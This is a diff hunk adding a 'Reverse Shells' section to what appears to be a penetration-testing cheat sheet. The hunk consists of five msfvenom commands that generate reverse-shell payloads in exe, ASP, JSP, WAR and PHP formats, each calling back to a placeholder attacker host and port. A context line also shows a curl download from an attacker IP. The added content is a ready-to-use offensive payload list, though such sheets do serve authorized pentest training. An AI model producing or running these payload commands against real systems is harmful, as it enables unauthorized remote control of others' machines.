@@ -472,6 +472,23 @@ curl http://<attacker-ip>/<file> -o <output_file>
 
 <details>
   <summary><strong>Reverse Shells</strong></summary>
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell-x64.exe
+```
+
+```bash
+msfvenom -p windows/shell/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f asp > shell.asp
+```
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.jsp
+```
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f war > shell.war
+```
+```bash
+msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port>-f raw > shell.php
+```
   
 </details>
 
